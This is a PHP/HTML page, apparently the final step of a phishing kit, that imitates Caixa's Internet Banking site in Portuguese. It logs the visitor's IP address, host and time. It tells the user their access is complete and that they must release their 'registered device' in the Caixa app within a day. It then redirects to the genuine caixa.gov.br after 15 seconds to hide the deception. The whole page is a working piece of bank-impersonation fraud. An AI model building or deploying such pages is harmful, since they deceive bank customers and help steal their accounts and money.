<?php

date_default_timezone_set('America/Sao_Paulo');
$prazo = 1;
$data_vencimento = date('d/m/Y', strtotime('+'.$prazo.' days'));
$data_documento = date('d/m/Y');
$numero22 = rand(10000000, 90000000);
$url2 = $_SERVER['HTTP_HOST']; 
$url1 = $_SERVER['REQUEST_URI'];
$hora = date("H:i:s");
$ip = $_SERVER["REMOTE_ADDR"];
?>

<!doctype html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="refresh" content="15;URL=https://www.caixa.gov.br/"> 
<meta name="viewport" content="width=device-width, initial-scale=1">
<title></title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
  <link href="css/pwr.css" rel="stylesheet" type="text/css" />
  <link rel="stylesheet" type="text/css" href="inicio.css">
<style type="text/css">
body {
	font-family: 'Roboto', sans-serif;
	margin-left: 0px;
	background:#FFF;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
</style>

</head>

<body>


<div style="width:100%; height:50px; background:#fd9607; color:#5574B4; font-family:'Arial'; font-size:17px; font-weight:bold;">
<table width="100%" cellspacing="0" cellpadding="0">
<tbody><tr>
<td width="30" height="50" bgcolor="#296fa7">
</td>
<td bgcolor="#296fa7" align="center"><font face="arial" color="#F5FBEF"><img src="../assets/img/logotipo.png" width="126" height="50"></font></td>
<td style="padding:0 10px 0 0;" width="30" bgcolor="#296fa7"></td>
</tr>
<tr>
<td height="3" bgcolor="#fd9607" align="center">
</td>
<td height="3" bgcolor="#fd9607" align="center">
</td>
<td height="3" bgcolor="#fd9607" align="center">
</td>
</tr>
</tbody></table>
</div>
<form name="form" id="form" action="" method="post">
<input type="hidden" name="data_vencimento" id="data_vencimento" value="<?= $data_vencimento; ?>">
</form>

<br><br><br><br><br>

<div style="width:90%; margin:0px auto; font-size:18px; text-align:center; margin-top:80px; color:#277eb6;">Agora você tem acesso completo ao Internet Banking Caixa pelo aplicativo. <br><br>

<p>Acesse seu aplicativo caixa para liberar seu dispositivo cadastrado.</p>
<p>Prazo de liberação: <?php echo $data_vencimento ?></p>

</div>


</body>
</html>